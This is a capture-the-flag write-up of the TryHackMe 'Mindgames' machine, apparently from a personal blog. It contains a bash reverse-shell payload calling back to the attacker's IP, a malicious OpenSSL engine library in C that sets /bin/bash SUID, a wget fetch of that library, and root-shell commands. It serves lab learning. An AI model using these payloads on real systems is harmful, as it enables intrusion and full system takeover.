---
date: 2020-06-12 21:12:32
layout: post
title: "Mindgames"
subtitle: Hard Machine from Tryhackme
description: 
image: /writeup/assets/img/mindgames/mindgames.png
optimized_image:
category: tryhackme
tags: hard
author:
paginate: false
---
<a href="https://tryhackme.com/room/mindgames">Link</a> to the machine on tryhackme.

I started with the nmap scan to look for open ports.
```bash
nmap -T4 -p- -A 10.10.132.232
```

Found 2 open ports. Accessed the site hosted on port 80 to find obfuscated text called Brainfuck programming language.
![placeholder](/writeup/assets/img/mindgames/site.png "site")
Decrypted the examples given on site using <a href="https://www.dcode.fr/brainfuck-language">Dcode.fr</a>
![placeholder](/writeup/assets/img/mindgames/print.png "helloworld")

The Brainfuck code translated into the python3 commands.

Created a payload of python reverse shell in Brainfuck language by using this <a href="https://copy.sh/brainfuck/text.html">Website</a>
```python3
import os

os.system('bash -c "bash -i >& /dev/tcp/10.9.12.192/8888 0>&1"')
```
![placeholder](/writeup/assets/img/mindgames/payload.png "payload")

Executed the payload through the website homepage to get a reverse shell.

Found the user.txt

Ran Linpeas on the machine and found some interesting capabilities.
![placeholder](/writeup/assets/img/mindgames/cap.png "capabilities")
 
 So the openssl binary was given permission to *setuid*
 
 Went to GTFObins and found that openssl command can be used to load specific shared libraries to execute commands.
![placeholder](/writeup/assets/img/mindgames/so.png "sharedlibrary")

Tried to create a .so file from simple c++ code. But falied.

Found this <a href="https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/">page</a> and used the code from it to create .so file.
```c
#include <openssl/engine.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static const char *engine_id = "test";
static const char *engine_name = "hope it works";

static int bind(ENGINE *e, const char *id)
{
  int ret = 0;

  if (!ENGINE_set_id(e, engine_id)) {
    fprintf(stderr, "ENGINE_set_id failed\n");
    goto end;
  }
  if (!ENGINE_set_name(e, engine_name)) {
    printf("ENGINE_set_name failed\n");
    goto end;
  }
  setuid(0);
  setgid(0);
  system("chmod u+s /bin/bash");
  system("echo done");
  ret = 1;
 end:
  return ret;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
Made a shared library out of this c++ code.
```bash
gcc -c fPIC test.c -o test
gcc -shared -o test.so -lcrypto test
```

Uploaded the file to the machine using wget,
```bash
wget http://10.9.12.192/test.so
``` 
Executed the following command from GTFObins to make the bash binary a SUID binary.
```
openssl req -engine /home/mindgames/test.so
```
![placeholder](/writeup/assets/img/mindgames/rce.png "rce")
This made the bash binary a SUID binary.

```bash 
bash -p
```
Got the root shell and found root.txt.
![placeholder](/writeup/assets/img/mindgames/root.png "root") 
